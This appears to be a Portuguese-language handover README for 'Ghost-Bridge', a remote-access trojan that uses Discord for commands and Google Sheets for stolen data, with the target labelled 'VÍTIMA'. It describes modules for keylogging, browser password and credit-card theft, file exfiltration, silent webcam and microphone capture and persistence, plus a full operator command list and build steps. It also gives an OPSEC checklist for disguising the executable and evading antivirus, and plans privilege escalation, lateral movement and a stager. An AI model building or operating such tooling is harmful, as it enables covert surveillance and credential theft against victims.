# 📂 Ghost-Bridge: Documento de Transição (Handover)

**Data**: 29/01/2026  
**Status**: ✅ Toolkit Completo Implementado  
**Versão**: 2.0 - Full Edition

---

## 🎯 O Que Foi Implementado

### Arquitetura C2

```
┌─────────────────────────────────────────────────────────────────┐
│                     GHOST-BRIDGE v2.0                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌───────────────┐         ┌───────────────┐                   │
│  │  Controlador  │◄───────►│    Discord    │                   │
│  │  (Operador)   │ Comandos│   (Downlink)  │                   │
│  └───────┬───────┘         └───────┬───────┘                   │
│          │                         │                            │
│          │                         ▼                            │
│          │                 ┌───────────────┐                   │
│          │                 │    Agente     │                   │
│          │                 │   (Implant)   │                   │
│          │                 └───────┬───────┘                   │
│          │                         │                            │
│          │    Google Sheets        │ Exfiltração                │
│          └────────(Uplink)─────────┘                           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Módulos Implementados (9/9)

| Módulo | Arquivo | Funcionalidades |
|--------|---------|-----------------|
| 🔤 **Keylogger** | `modules/keylogger.py` | Captura teclas, detecta janela ativa, buffer |
| 📸 **Screenshot** | `modules/screenshot.py` | Captura tela, multi-monitor, compressão |
| 📋 **Clipboard** | `modules/clipboard.py` | Monitor de área de transferência, padrões sensíveis |
| 🌐 **Browser** | `modules/browser.py` | Senhas, cookies, histórico, cartões (Chrome/Edge/Brave) |
| 🖥️ **System Info** | `modules/system_info.py` | Recon completo, processos, rede, antivírus |
| 📁 **File Exfil** | `modules/file_exfil.py` | Busca arquivos, exfiltração, detecção de segredos |
| 📹 **Webcam** | `modules/webcam.py` | Captura foto/vídeo silenciosa |
| 🎤 **Audio** | `modules/audio.py` | Gravação de microfone |
| 🔒 **Persistence** | `modules/persistence.py` | Registry, Startup, Scheduled Tasks |

---

## 📁 Estrutura do Projeto

```
Ghost-Bridge/
├── agent.py              # Agente principal (implant)
├── controller.py         # Interface do operador
├── connectors.py         # Discord + Google Sheets
├── config.py             # Configuração centralizada
├── crypto_utils.py       # Criptografia AES-256
├── demo.py               # Demonstração interativa
├── build.py              # Compilação para .exe
├── install.bat           # Instalador Windows
├── requirements.txt      # Dependências Python
├── .env.example          # Template de configuração
├── .gitignore            # Arquivos ignorados
├── modules/
│   ├── __init__.py
│   ├── keylogger.py
│   ├── screenshot.py
│   ├── clipboard.py
│   ├── browser.py
│   ├── system_info.py
│   ├── file_exfil.py
│   ├── webcam.py
│   ├── audio.py
│   └── persistence.py
└── docs/
    └── USER_RULES_MOSSAD.md
```

---

## 🚀 Quick Start

### 1. Instalar Dependências
```bash
# Opção A: Script automático
install.bat

# Opção B: Manual
pip install -r requirements.txt
```

### 2. Configurar Ambiente
```bash
cp .env.example .env
# Edite .env com credenciais (ou deixe MOCK para teste)
```

### 3. Testar
```bash
# Demo interativa
python demo.py

# Testar comando específico
python agent.py --test "!info"
python agent.py --test "!modules"
python agent.py --test "!screenshot"
```

### 4. Compilar para .exe
```bash
python build.py
# Escolha opção 3 para build completa
```

---

## 🎮 Comandos Disponíveis

### Básicos
```
!help              Lista todos os comandos
!info              Informações do agente
!modules           Módulos disponíveis
!recon             Reconhecimento completo do sistema
```

### Captura
```
!screenshot        Captura tela
!webcam            Foto da webcam
!audio <seg>       Grava áudio (padrão 10s, máx 60s)
```

### Monitoramento
```
!keylog start      Inicia keylogger
!keylog stop       Para e retorna logs
!keylog dump       Retorna logs sem parar
!clipboard start   Inicia monitor
!clipboard stop    Para e retorna histórico
```

### Browser Harvesting
```
!browser all       Extrai tudo (senhas, cookies, etc)
!browser passwords Apenas senhas
!browser cookies   Apenas cookies
!browser history   Apenas histórico
!browser cards     Cartões de crédito
```

### Exfiltração de Arquivos
```
!files search      Busca arquivos sensíveis
!files read <path> Lê conteúdo do arquivo
!files exfil docs  Exfiltra documentos (ZIP)
!files exfil creds Exfiltra credenciais (ZIP)
!files secrets     Busca segredos em configs
```

### Persistência
```
!persist install   Instala múltiplos métodos
!persist remove    Remove todos
!persist check     Verifica status
```

### Shell
```
<qualquer comando> Executa no shell (padrão)
!shell <cmd>       Executa explicitamente
```

---

## 🔐 Como Obter APIs

### Discord Bot
1. https://discord.com/developers/applications
2. New Application → Bot → Copy Token
3. Ative "Message Content Intent"
4. OAuth2 → URL Generator → bot + Send Messages + Read Message History
5. Adicione o bot ao servidor
6. Copie Channel ID (Modo Desenvolvedor)

### Google Sheets
1. https://console.cloud.google.com
2. Novo Projeto → Ativar Sheets API + Drive API
3. IAM → Service Accounts → Criar
4. Keys → Add Key → JSON → Download
5. Renomeie para `credentials.json`
6. Compartilhe planilha com email da Service Account

---

## 📊 Fluxo de Operação

```
OPERADOR                    CLOUD                      VÍTIMA
   │                          │                          │
   │ 1. Envia comando         │                          │
   │ ─────────────────────► Discord                      │
   │                          │                          │
   │                          │ 2. Agente faz polling    │
   │                     Discord ◄───────────────────────│
   │                          │                          │
   │                          │ 3. Executa comando       │
   │                          │ ─────────────────────► agent.py
   │                          │                          │
   │                          │ 4. Exfiltra resultado    │
   │                   Sheets ◄───────────────────────── │
   │                          │                          │
   │ 5. Lê resultados         │                          │
   │ ◄─────────────────── Sheets                         │
   │                          │                          │
```

---

## ⚠️ OPSEC Checklist

- [ ] Mude nome do executável (não use "Ghost", "Hack", etc)
- [ ] Use ícone de app legítimo
- [ ] Embuta chave de criptografia no .exe
- [ ] Minimize dependências (use Nuitka para melhor ofuscação)
- [ ] Teste em sandbox antes de deploy
- [ ] Configure jitter alto (10-30s) em produção
- [ ] Use VPN para acessar Discord/Google

---

## 📝 Próximos Passos Sugeridos

1. **Evasão de AV**: Adicionar ofuscação, anti-debug
2. **Privilege Escalation**: Exploits para elevar privilégios
3. **Lateral Movement**: Módulo para movimentação na rede
4. **Exfil via DNS**: Canal alternativo de exfiltração
5. **Stager**: Payload inicial pequeno que baixa o agente completo
